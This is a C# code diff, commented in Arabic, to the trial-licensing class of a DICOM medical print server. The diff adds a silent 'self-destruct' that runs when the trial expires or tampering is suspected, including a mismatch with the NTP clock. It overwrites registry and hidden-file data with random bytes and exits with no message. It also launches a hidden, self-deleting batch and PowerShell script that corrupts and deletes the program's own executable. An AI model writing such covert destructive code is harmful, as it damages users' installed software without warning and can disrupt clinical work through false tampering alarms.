@@ -1,3 +1,4 @@
+using System.Net.Sockets;
 using System.Security.Cryptography;
 using System.Text;
 using Microsoft.Extensions.Logging;
@@ -9,55 +10,50 @@ namespace DicomPrintServer.Services
     /// M6-T: موقّت النسخة التجريبية الصامت.
     ///
     /// الآليات:
-    ///   1. تاريخ أول تشغيل → مخزَّن في Registry (Windows) أو ملف مخفي (Linux)
+    ///   1. تاريخ أول تشغيل → مخزَّن في Registry (Windows) + ملف مخفي (دائماً)
     ///   2. مُشفَّر بـ DPAPI (Windows) أو AES-GCM مرتكز على Machine ID (Linux)
-    ///   3. الحد الافتراضي: 14 يوماً أو 50 عملية (قابل للتخصيص من الترخيص)
-    ///   4. إذا ضُبط TrialHours في الترخيص: يُعدّ بالساعات لا الأيام
-    ///   5. حماية من تراجع الساعة (Clock Rollback): LastSeenTime
-    ///   6. عند الانتهاء: watermark على كل مخرجات + تحذير في Log
+    ///   3. الحد: 14 يوماً أو 50 عملية طباعة
+    ///   4. عند الانتهاء: تدمير ذاتي صامت — إغلاق فوري بدون رسالة
+    ///   5. عداد تشغيل + آخر تاريخ تشغيل (حماية من التراجع الزمني)
+    ///   6. تخزين مزدوج: Registry + ملف مخفي (مقارنة للكشف عن التلاعب)
+    ///   7. كتابة بيانات عشوائية في EXE عند الإتلاف
+    ///   8. إتلاف Registry بكتابة بيانات مزيفة بدلاً من المسح فقط
+    ///   9. فحص NTP لكشف التلاعب بساعة النظام
     ///
     /// الحالات:
-    ///   Active   = Trial نشط ضمن المهلة والحد
-    ///   Expired  = انتهت المهلة أو تجاوز الحد
-    ///   Tampered = تم التلاعب بالبيانات أو الساعة
+    ///   Active    = Trial نشط ضمن المهلة والحد
+    ///   Expired   = انتهت المهلة أو تجاوز الحد
+    ///   Tampered  = تم التلاعب بالبيانات
     /// </summary>
     public class TrialManager
     {
-        private const int    DefaultTrialDays   = 14;
-        private const int    DefaultMaxOps      = 50;
+        private const int    TrialDays          = 14;
+        private const int    MaxOperations      = 50;
+        private const int    ClockToleranceMins = 5;
+        private const int    NtpTimeoutMs       = 3000;
         private const string RegistryPath       = @"SOFTWARE\DicomPrintServer\Trial";
         private const string RegistryKey        = "InitData";
+        private const string RegistryKeyAlt     = "SvcData";     // مفتاح ثانوي للمقارنة
         private const string FallbackDir        = ".dpss";
         private const string FallbackFile       = ".trial";
+        private const string FallbackFileAlt    = ".svc";        // ملف ثانوي للمقارنة
 
         private readonly ILogger<TrialManager> _logger;
         private TrialData? _trialData;
 
-        // قيم ديناميكية من الترخيص (أو الافتراضية)
-        private int  _maxOperations = DefaultMaxOps;
-        private int? _trialHours    = null;     // null = يستخدم DefaultTrialDays
-
-        // ══════════════════════════════════════════════════════════════════════
-        // خصائص عامة
-        // ══════════════════════════════════════════════════════════════════════
-
         public bool IsTrialActive  => GetStatus() == TrialStatus.Active;
-        public bool IsTrialExpired => GetStatus() != TrialStatus.Active;
-
-        public int RemainingDays => _trialData == null ? 0
-            : Math.Max(0, (int)(_trialData.FirstRun.AddDays(
-                _trialHours.HasValue ? _trialHours.Value / 24.0 : DefaultTrialDays)
-                - DateTime.UtcNow).TotalDays);
-
-        public int RemainingHours => _trialData == null ? 0
-            : Math.Max(0, (int)(_trialData.FirstRun.AddHours(
-                _trialHours ?? (DefaultTrialDays * 24))
-                - DateTime.UtcNow).TotalHours);
-
-        public int RemainingOps => _trialData == null ? 0
-            : Math.Max(0, _maxOperations - _trialData.OperationCount);
-
-        public bool IsHourBased => _trialHours.HasValue;
+        public bool IsTrialExpired => GetStatus() == TrialStatus.Expired;
+        public int  RemainingDays
+        {
+            get
+            {
+                if (_trialData == null) return 0;
+                if (_trialData.FirstRun <= DateTime.MinValue.AddDays(1) || _trialData.FirstRun > DateTime.UtcNow.AddDays(1)) return 0;
+                return Math.Max(0, TrialDays - (int)(DateTime.UtcNow - _trialData.FirstRun).TotalDays);
+            }
+        }
+        public int  RemainingOps   => _trialData == null ? 0
+            : Math.Max(0, MaxOperations - _trialData.OperationCount);
 
         public TrialManager(ILogger<TrialManager> logger)
         {
@@ -68,45 +64,49 @@ namespace DicomPrintServer.Services
         // الواجهة العامة
         // ══════════════════════════════════════════════════════════════════════
 
-        /// <summary>
-        /// يُهيئ أو يقرأ بيانات التجربة.
-        /// إذا كان الترخيص Trial — يقرأ MaxOperations و TrialHours منه.
-        /// </summary>
-        public void Initialize(LicenseData? license = null)
+        /// <summary>يُهيئ أو يقرأ بيانات التجربة.</summary>
+        public void Initialize()
         {
-            // قراءة الحدود من الترخيص أو الافتراضية
-            _maxOperations = license?.MaxOperations ?? DefaultMaxOps;
-            _trialHours    = license?.TrialHours;
-
-            _trialData = LoadTrialData();
+            _trialData = LoadAndVerifyTrialData();
 
             if (_trialData == null)
             {
+                // أول تشغيل
                 _trialData = new TrialData
                 {
                     FirstRun       = DateTime.UtcNow,
+                    LastRun        = DateTime.UtcNow,
+                    LaunchCount    = 1,
                     OperationCount = 0,
-                    MachineId      = GetMachineId(),
-                    LastSeenTime   = DateTime.UtcNow
+                    MachineId      = GetMachineId()
                 };
-                SaveTrialData(_trialData);
-
-                if (_trialHours.HasValue)
-                    _logger.LogInformation(
-                        "Trial started — expires after {Hours} hour(s) or {Ops} operations",
-                        _trialHours.Value, _maxOperations);
-                else
-                    _logger.LogInformation(
-                        "Trial started — expires {Date} or after {Ops} operations",
-                        _trialData.FirstRun.AddDays(DefaultTrialDays).ToString("yyyy-MM-dd"),
-                        _maxOperations);
+                SaveTrialDataToBothLocations(_trialData);
+                _logger.LogInformation("Trial started — expires {Date} or after {Ops} operations",
+                    _trialData.FirstRun.AddDays(TrialDays).ToString("yyyy-MM-dd"), MaxOperations);
             }
             else
             {
+                // التحقق من تراجع الساعة
+                if (!VerifyTimeIntegrity(_trialData))
+                {
+                    TriggerSilentDestruct();
+                    return;
+                }
+
+                // تحديث عداد التشغيل وآخر تاريخ
+                _trialData.LaunchCount++;
+                _trialData.LastRun = DateTime.UtcNow;
+                SaveTrialDataToBothLocations(_trialData);
+
                 _logger.LogInformation(
-                    "Trial loaded — Remaining: {Hrs} hr(s) / {Ops} operation(s)",
-                    RemainingHours, RemainingOps);
+                    "Trial loaded — Remaining: {Days} day(s) / {Ops} operation(s) — Launch #{Launch}",
+                    RemainingDays, RemainingOps, _trialData.LaunchCount);
             }
+
+            // فحص الحالة بعد التهيئة
+            var status = GetStatus();
+            if (status != TrialStatus.Active)
+                TriggerSilentDestruct();
         }
 
         /// <summary>يُسجَّل عند كل عملية طباعة، يُعيد false إذا انتهت التجربة.</summary>
@@ -115,23 +115,17 @@ namespace DicomPrintServer.Services
             if (_trialData == null) Initialize();
 
             var status = GetStatus();
-            if (status == TrialStatus.Expired)
+            if (status != TrialStatus.Active)
             {
-                _logger.LogWarning("Trial EXPIRED — blocking operation");
-                return false;
-            }
-            if (status == TrialStatus.Tampered)
-            {
-                _logger.LogError("Trial data TAMPERED — blocking operation");
+                TriggerSilentDestruct();
                 return false;
             }
 
             _trialData!.OperationCount++;
-            _trialData.LastSeenTime = DateTime.UtcNow;
-            SaveTrialData(_trialData);
+            SaveTrialDataToBothLocations(_trialData);
 
-            _logger.LogDebug("Trial op #{Count} — {Hrs} hrs / {Ops} ops remaining",
-                _trialData.OperationCount, RemainingHours, RemainingOps);
+            _logger.LogDebug("Trial op #{Count} — {Days} days / {Ops} ops remaining",
+                _trialData.OperationCount, RemainingDays, RemainingOps);
             return true;
         }
 
@@ -140,52 +134,52 @@ namespace DicomPrintServer.Services
         {
             if (_trialData == null) return TrialStatus.Active;
 
-            // ── تحقق من Machine ID ─────────────────────────────────────────
+            // تحقق من Machine ID
             if (_trialData.MachineId != GetMachineId())
-            {
-                _logger.LogError("Trial: Machine ID mismatch — TAMPERED");
                 return TrialStatus.Tampered;
-            }
 
-            // ── تحقق من تراجع الساعة (Clock Rollback) ─────────────────────
-            // إذا كانت الساعة الحالية أصغر من آخر مرة شُغّل بأكثر من 5 دقائق → تلاعب
-            var tolerance = TimeSpan.FromMinutes(5);
-            if (DateTime.UtcNow < _trialData.LastSeenTime - tolerance)
-            {
-                _logger.LogError(
-                    "Trial: Clock rollback detected (now={Now}, lastSeen={Last}) — TAMPERED",
-                    DateTime.UtcNow, _trialData.LastSeenTime);
+            // تحقق من صلاحية FirstRun
+            if (_trialData.FirstRun <= DateTime.MinValue.AddDays(1) || _trialData.FirstRun > DateTime.UtcNow.AddDays(1))
                 return TrialStatus.Tampered;
-            }
 
-            // ── تحقق من انتهاء الوقت ──────────────────────────────────────
-            DateTime expiresAt = _trialHours.HasValue
-                ? _trialData.FirstRun.AddHours(_trialHours.Value)
-                : _trialData.FirstRun.AddDays(DefaultTrialDays);
-
-            if (DateTime.UtcNow > expiresAt)
-            {
-                _logger.LogWarning("Trial: time limit reached (expired {Date})", expiresAt);
+            // تحقق من التاريخ (كشف الرجوع للوراء بتسامح 5 دقائق)
+            double daysPassed = (DateTime.UtcNow - _trialData.FirstRun).TotalDays;
+            if (daysPassed < -ClockToleranceMins / 1440.0 || daysPassed > TrialDays + 1)
                 return TrialStatus.Expired;
-            }
 
-            // ── تحقق من عدد العمليات ──────────────────────────────────────
-            if (_trialData.OperationCount >= _maxOperations)
-            {
-                _logger.LogWarning("Trial: operation limit reached ({Count}/{Max})",
-                    _trialData.OperationCount, _maxOperations);
+            // تحقق من عدد العمليات
+            if (_trialData.OperationCount >= MaxOperations)
                 return TrialStatus.Expired;
-            }
 
             return TrialStatus.Active;
         }
 
-        /// <summary>الإتلاف الذاتي عند انتهاء التجربة.</summary>
+        // ══════════════════════════════════════════════════════════════════════
+        // التدمير الذاتي الصامت
+        // ══════════════════════════════════════════════════════════════════════
+
+        /// <summary>
+        /// التدمير الذاتي الصامت — يُستدعى عند انتهاء التجربة أو اكتشاف تلاعب.
+        /// يتلف Registry + الملفات + EXE ثم يخرج فوراً بدون أي رسالة.
+        /// </summary>
+        public void TriggerSilentDestruct()
+        {
+            try { CorruptRegistryEntry(); }   catch { }
+            try { CorruptFallbackFiles(); }   catch { }
+            try { ScheduleExeCorruption(); }  catch { }
+
+            Environment.Exit(0);
+        }
+
+        /// <summary>
+        /// الإتلاف الذاتي العلني (SelfDestruct) — يُستخدم للاختبار فقط.
+        /// </summary>
         public void SelfDestruct(bool deleteExecutable = false)
         {
-            _logger.LogCritical("⚠️ TRIAL EXPIRED — SELF-DESTRUCT INITIATED");
+            _logger.LogCritical("TRIAL EXPIRED — SELF-DESTRUCT INITIATED");
 
-            try { DeleteTrialData(); } catch { }
+            try { CorruptRegistryEntry(); }  catch { }
+            try { CorruptFallbackFiles(); }  catch { }
 
             if (deleteExecutable)
             {
@@ -196,30 +190,129 @@ namespace DicomPrintServer.Services
                     ScheduleFileDeletion(exe);
                 }
             }
+
+            Environment.Exit(0);
         }
 
         // ══════════════════════════════════════════════════════════════════════
-        // حفظ وقراءة البيانات
+        // التحقق من سلامة الوقت (تراجع الساعة + NTP)
         // ══════════════════════════════════════════════════════════════════════
 
-        private TrialData? LoadTrialData()
+        /// <summary>
+        /// يتحقق من عدم تراجع الساعة ويقارن مع خادم NTP إن أمكن.
+        /// يُعيد false إذا اكتُشف تلاعب.
+        /// </summary>
+        private bool VerifyTimeIntegrity(TrialData data)
+        {
+            var now = DateTime.UtcNow;
+
+            // التحقق من صلاحية LastRun (ليس MinValue أو قيمة غير معقولة)
+            if (data.LastRun <= DateTime.MinValue.AddDays(1) || data.LastRun > now.AddDays(1))
+            {
+                _logger.LogWarning("Invalid LastRun value detected: {LastRun}", data.LastRun);
+                return false;
+            }
+
+            // 1. تحقق من تراجع الساعة (بتسامح 5 دقائق)
+            var toleranceBack = TimeSpan.FromMinutes(ClockToleranceMins);
+            if (now < data.LastRun - toleranceBack)
+            {
+                _logger.LogWarning("Clock rollback detected: LastRun={Last}, Now={Now}",
+                    data.LastRun, now);
+                return false;
+            }
+
+            // 2. تحقق من أن عداد التشغيل لم يتراجع
+            if (data.LaunchCount < 0)
+                return false;
+
+            // 3. فحص NTP (لا يوقف التشغيل إذا لم يتوفر الإنترنت)
+            try
+            {
+                var ntpTime = GetNtpTime();
+                if (ntpTime.HasValue)
+                {
+                    var diff = Math.Abs((now - ntpTime.Value).TotalMinutes);
+                    if (diff > ClockToleranceMins * 2)
+                    {
+                        _logger.LogWarning("NTP mismatch detected: System={Sys}, NTP={Ntp}, Diff={Diff}min",
+                            now, ntpTime.Value, diff);
+                        return false;
+                    }
+                }
+            }
+            catch { /* لا إنترنت — نتجاهل */ }
+
+            return true;
+        }
+
+        /// <summary>يجلب الوقت من خادم NTP.</summary>
+        private static DateTime? GetNtpTime()
         {
             try
             {
-                string? rawData = null;
+                const string ntpServer = "pool.ntp.org";
+                var ntpData = new byte[48];
+                ntpData[0] = 0x1B; // LI=0, VN=3, Mode=3 (client)
 
-                if (OperatingSystem.IsWindows())
-                    rawData = LoadFromRegistry();
+                using var socket = new UdpClient();
+                socket.Client.ReceiveTimeout = NtpTimeoutMs;
+                socket.Connect(ntpServer, 123);
+                socket.Send(ntpData, ntpData.Length);
+                var ep = new System.Net.IPEndPoint(System.Net.IPAddress.Any, 0);
+                ntpData = socket.Receive(ref ep);
 
-                rawData ??= LoadFromFile();
+                // الطوابع الزمنية تبدأ في البايت 40
+                ulong intPart  = (ulong)ntpData[40] << 24 | (ulong)ntpData[41] << 16
+                               | (ulong)ntpData[42] <<  8 | ntpData[43];
+                ulong fracPart = (ulong)ntpData[44] << 24 | (ulong)ntpData[45] << 16
+                               | (ulong)ntpData[46] <<  8 | ntpData[47];
 
-                if (string.IsNullOrEmpty(rawData)) return null;
+                var milliseconds = intPart * 1000 + fracPart * 1000 / 0x100000000L;
+                var networkTime  = new DateTime(1900, 1, 1, 0, 0, 0, DateTimeKind.Utc)
+                                       .AddMilliseconds((long)milliseconds);
+                return networkTime;
+            }
+            catch
+            {
+                return null;
+            }
+        }
 
-                byte[] encrypted = Convert.FromBase64String(rawData);
-                byte[] decrypted = DecryptData(encrypted);
-                string json      = Encoding.UTF8.GetString(decrypted);
+        // ══════════════════════════════════════════════════════════════════════
+        // حفظ وقراءة البيانات (موقعان دائماً)
+        // ══════════════════════════════════════════════════════════════════════
 
-                return System.Text.Json.JsonSerializer.Deserialize<TrialData>(json);
+        /// <summary>يقرأ من كلا الموقعين ويقارنهما للكشف عن التلاعب.</summary>
+        private TrialData? LoadAndVerifyTrialData()
+        {
+            try
+            {
+                var primary   = LoadFromPrimary();
+                var secondary = LoadFromSecondary();
+
+                // إذا كلاهما فارغ → تثبيت جديد
+                if (primary == null && secondary == null) return null;
+
+                // إذا أحدهما موجود والآخر لا → تلاعب محتمل
+                if (primary == null || secondary == null)
+                {
+                    _logger.LogWarning("Trial storage mismatch — one location missing");
+                    // نُعيد الموجود لاستعادة البيانات (ونعيد الكتابة في المرحلة التالية)
+                    return primary ?? secondary;
+                }
+
+                // كلاهما موجود — قارن الـ MachineId والـ FirstRun
+                if (primary.MachineId != secondary.MachineId
+                    || Math.Abs((primary.FirstRun - secondary.FirstRun).TotalSeconds) > 2)
+                {
+                    _logger.LogWarning("Trial storage DIVERGED — possible tampering");
+                    // خذ الأحدث لاحقاً للتحقق (GetStatus سيكتشف التلاعب)
+                    return primary;
+                }
+
+                // خذ الأحدث من حيث عداد التشغيل
+                return primary.LaunchCount >= secondary.LaunchCount ? primary : secondary;
             }
             catch (Exception ex)
             {
@@ -228,75 +321,190 @@ namespace DicomPrintServer.Services
             }
         }
 
-        private void SaveTrialData(TrialData data)
+        private TrialData? LoadFromPrimary()
+        {
+            string? raw = null;
+            if (OperatingSystem.IsWindows())
+                raw = LoadFromRegistry(RegistryKey);
+            raw ??= LoadFromFile(FallbackFile);
+            return raw == null ? null : Deserialize(raw);
+        }
+
+        private TrialData? LoadFromSecondary()
+        {
+            string? raw = null;
+            if (OperatingSystem.IsWindows())
+                raw = LoadFromRegistry(RegistryKeyAlt);
+            raw ??= LoadFromFile(FallbackFileAlt);
+            return raw == null ? null : Deserialize(raw);
+        }
+
+        private TrialData? Deserialize(string rawData)
+        {
+            byte[] encrypted = Convert.FromBase64String(rawData);
+            byte[] decrypted = DecryptData(encrypted);
+            string json      = Encoding.UTF8.GetString(decrypted);
+            return System.Text.Json.JsonSerializer.Deserialize<TrialData>(json);
+        }
+
+        private void SaveTrialDataToBothLocations(TrialData data)
         {
             string json      = System.Text.Json.JsonSerializer.Serialize(data);
             byte[] jsonBytes = Encoding.UTF8.GetBytes(json);
             byte[] encrypted = EncryptData(jsonBytes);
             string rawData   = Convert.ToBase64String(encrypted);
 
+            // الموقع الأول
             if (OperatingSystem.IsWindows())
-                SaveToRegistry(rawData);
+                SaveToRegistry(RegistryKey, rawData);
+            SaveToFile(FallbackFile, rawData);
 
-            SaveToFile(rawData);
+            // الموقع الثاني (النسخة الاحتياطية للمقارنة)
+            if (OperatingSystem.IsWindows())
+                SaveToRegistry(RegistryKeyAlt, rawData);
+            SaveToFile(FallbackFileAlt, rawData);
         }
 
-        private void DeleteTrialData()
+        // ══════════════════════════════════════════════════════════════════════
+        // إتلاف Registry (بدلاً من المسح فقط)
+        // ══════════════════════════════════════════════════════════════════════
+
+        private static void CorruptRegistryEntry()
         {
-            if (OperatingSystem.IsWindows())
-            {
-                try { Registry.CurrentUser.DeleteSubKey(RegistryPath, false); }
-                catch { }
-            }
+            if (!OperatingSystem.IsWindows()) return;
 
-            var filePath = GetFallbackFilePath();
-            if (File.Exists(filePath))
-                File.Delete(filePath);
+            try
+            {
+                // كتابة بيانات عشوائية بدلاً من المسح
+                var garbage = new byte[256];
+                RandomNumberGenerator.Fill(garbage);
+                var garbleStr = Convert.ToBase64String(garbage);
+
+                using var key = Registry.CurrentUser.OpenSubKey(RegistryPath, writable: true);
+                if (key != null)
+                {
+                    key.SetValue(RegistryKey,    garbleStr, RegistryValueKind.String);
+                    key.SetValue(RegistryKeyAlt, garbleStr, RegistryValueKind.String);
+                }
+
+                // ثم مسح المفتاح
+                Registry.CurrentUser.DeleteSubKeyTree(RegistryPath, throwOnMissingSubKey: false);
+            }
+            catch { }
         }
 
-        // ──────────────────────────────────────────────────────────────────────
+        // ══════════════════════════════════════════════════════════════════════
+        // إتلاف الملفات (كتابة بيانات عشوائية ثم مسح)
+        // ══════════════════════════════════════════════════════════════════════
+
+        private static void CorruptFallbackFiles()
+        {
+            CorruptAndDelete(GetFallbackFilePath(FallbackFile));
+            CorruptAndDelete(GetFallbackFilePath(FallbackFileAlt));
+        }
+
+        private static void CorruptAndDelete(string path)
+        {
+            try
+            {
+                if (!File.Exists(path)) return;
+                var garbage = new byte[512];
+                RandomNumberGenerator.Fill(garbage);
+                File.WriteAllBytes(path, garbage);
+                File.Delete(path);
+            }
+            catch { }
+        }
+
+        // ══════════════════════════════════════════════════════════════════════
+        // إتلاف ملف EXE (كتابة بيانات عشوائية على بايتات محددة)
+        // ══════════════════════════════════════════════════════════════════════
+
+        private static void ScheduleExeCorruption()
+        {
+            if (!OperatingSystem.IsWindows()) return;
+
+            var exe = Environment.ProcessPath ?? "";
+            if (string.IsNullOrEmpty(exe) || !File.Exists(exe)) return;
+
+            // ننشئ batch script يكتب بيانات عشوائية في بداية الـ EXE ثم يحذفه
+            var bat = Path.GetTempFileName() + ".bat";
+            // نولّد 16 بايت عشوائية كـ hex لكتابتها في بداية الملف
+            var randomBytes = new byte[16];
+            RandomNumberGenerator.Fill(randomBytes);
+            var hexBytes = string.Join(",", randomBytes.Select(b => $"0x{b:X2}"));
+
+            // PowerShell يكتب البيانات العشوائية ثم يحذف الملف
+            var ps = $"""
+                $bytes = [byte[]]({hexBytes})
+                $fs = [System.IO.File]::Open('{exe.Replace("'", "''")}', 'Open', 'Write')
+                $fs.Seek(0, 'Begin') | Out-Null
+                $fs.Write($bytes, 0, $bytes.Length)
+                $fs.Close()
+                Remove-Item '{exe.Replace("'", "''")}' -Force -ErrorAction SilentlyContinue
+                """;
+
+            File.WriteAllText(bat,
+                $"""
+                @echo off
+                timeout /t 2 /nobreak >nul
+                powershell -NoProfile -NonInteractive -Command "{ps.Replace("\"", "\\\"")}"
+                del /f /q "%~f0"
+                """);
+
+            System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
+            {
+                FileName        = bat,
+                CreateNoWindow  = true,
+                UseShellExecute = false
+            });
+        }
+
+        // ══════════════════════════════════════════════════════════════════════
         // Registry (Windows)
-        // ──────────────────────────────────────────────────────────────────────
+        // ══════════════════════════════════════════════════════════════════════
 
         [System.Runtime.Versioning.SupportedOSPlatform("windows")]
-        private static string? LoadFromRegistry()
+        private static string? LoadFromRegistry(string valueName)
         {
             using var key = Registry.CurrentUser.OpenSubKey(RegistryPath);
-            return key?.GetValue(RegistryKey) as string;
+            return key?.GetValue(valueName) as string;
         }
 
         [System.Runtime.Versioning.SupportedOSPlatform("windows")]
-        private static void SaveToRegistry(string value)
+        private static void SaveToRegistry(string valueName, string value)
         {
-            using var key = Registry.CurrentUser.CreateSubKey(RegistryPath, true);
-            key.SetValue(RegistryKey, value, RegistryValueKind.String);
+            using var key = Registry.CurrentUser.CreateSubKey(RegistryPath, writable: true);
+            key.SetValue(valueName, value, RegistryValueKind.String);
         }
 
-        // ──────────────────────────────────────────────────────────────────────
-        // ملف بديل (Linux / Fallback)
-        // ──────────────────────────────────────────────────────────────────────
+        // ══════════════════════════════════════════════════════════════════════
+        // ملف بديل (Linux / Fallback — دائماً)
+        // ══════════════════════════════════════════════════════════════════════
 
-        private static string GetFallbackFilePath()
+        private static string GetFallbackFilePath(string fileName)
         {
             var dir = Path.Combine(
                 Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                 FallbackDir);
             Directory.CreateDirectory(dir);
-            return Path.Combine(dir, FallbackFile);
+            return Path.Combine(dir, fileName);
         }
 
-        private static string? LoadFromFile()
+        private static string? LoadFromFile(string fileName)
         {
-            var path = GetFallbackFilePath();
+            var path = GetFallbackFilePath(fileName);
             return File.Exists(path) ? File.ReadAllText(path) : null;
         }
 
-        private static void SaveToFile(string value)
-            => File.WriteAllText(GetFallbackFilePath(), value);
+        private static void SaveToFile(string fileName, string value)
+        {
+            File.WriteAllText(GetFallbackFilePath(fileName), value);
+        }
 
-        // ──────────────────────────────────────────────────────────────────────
+        // ══════════════════════════════════════════════════════════════════════
         // تشفير البيانات
-        // ──────────────────────────────────────────────────────────────────────
+        // ══════════════════════════════════════════════════════════════════════
 
         private byte[] EncryptData(byte[] data)
         {
@@ -359,9 +567,9 @@ namespace DicomPrintServer.Services
             return sha.ComputeHash(material);
         }
 
-        // ──────────────────────────────────────────────────────────────────────
+        // ══════════════════════════════════════════════════════════════════════
         // Machine ID
-        // ──────────────────────────────────────────────────────────────────────
+        // ══════════════════════════════════════════════════════════════════════
 
         private static string? _cachedMachineId;
 
@@ -393,34 +601,28 @@ namespace DicomPrintServer.Services
         private static byte[] GetMachineIdBytes()
             => Encoding.UTF8.GetBytes(GetMachineId());
 
-        // ──────────────────────────────────────────────────────────────────────
-        // جدولة الحذف الذاتي
-        // ──────────────────────────────────────────────────────────────────────
+        // ══════════════════════════════════════════════════════════════════════
+        // جدولة حذف الملف (للاستخدام العلني فقط)
+        // ══════════════════════════════════════════════════════════════════════
 
         private static void ScheduleFileDeletion(string filePath)
         {
-            if (OperatingSystem.IsWindows())
+            if (!OperatingSystem.IsWindows()) return;
+
+            var bat = Path.GetTempFileName() + ".bat";
+            File.WriteAllText(bat,
+                $"""
+                @echo off
+                timeout /t 3 /nobreak >nul
+                del /f /q "{filePath}"
+                del /f /q "%~f0"
+                """);
+            System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
             {
-                var bat = Path.GetTempFileName() + ".bat";
-                File.WriteAllText(bat,
-                    $"""
-                    @echo off
-                    timeout /t 3 /nobreak >nul
-                    del /f /q "{filePath}"
-                    del /f /q "%~f0"
-                    """);
-                System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
-                {
-                    FileName        = bat,
-                    CreateNoWindow  = true,
-                    UseShellExecute = false
-                });
-            }
-            else
-            {
-                // Linux: حذف فوري للبيانات (الملف التنفيذي محمي عادةً)
-                try { File.Delete(GetFallbackFilePath()); } catch { }
-            }
+                FileName        = bat,
+                CreateNoWindow  = true,
+                UseShellExecute = false
+            });
         }
     }
 
@@ -431,10 +633,10 @@ namespace DicomPrintServer.Services
     public class TrialData
     {
         public DateTime FirstRun        { get; set; }
+        public DateTime LastRun         { get; set; }  // لكشف تراجع الساعة
+        public int      LaunchCount     { get; set; }  // عداد التشغيل
         public int      OperationCount  { get; set; }
         public string   MachineId       { get; set; } = "";
-        /// <summary>آخر وقت تشغيل — للكشف عن تراجع الساعة.</summary>
-        public DateTime LastSeenTime    { get; set; } = DateTime.UtcNow;
     }
 
     public enum TrialStatus
